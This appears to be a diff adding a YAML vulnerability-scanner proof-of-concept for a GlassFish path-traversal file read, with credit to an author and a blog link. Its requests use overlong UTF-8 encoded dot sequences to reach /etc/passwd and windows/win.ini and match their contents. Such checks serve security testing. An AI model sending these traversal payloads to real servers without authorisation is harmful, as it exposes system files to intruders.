@@ -1,0 +1,22 @@
+name: poc-yaml-glassfish-file-read
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: GET
+            path: /theme/META-INF/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    windows0:
+        request:
+            cache: true
+            method: GET
+            path: /theme/META-INF/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/windows/win.ini
+            follow_redirects: false
+        expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+expression: windows0() || linux0()
+detail:
+    author: AkBanner(https://github.com/AkBanner)
+    link: https://blog.csdn.net/xuandao_ahfengren/article/details/106730594
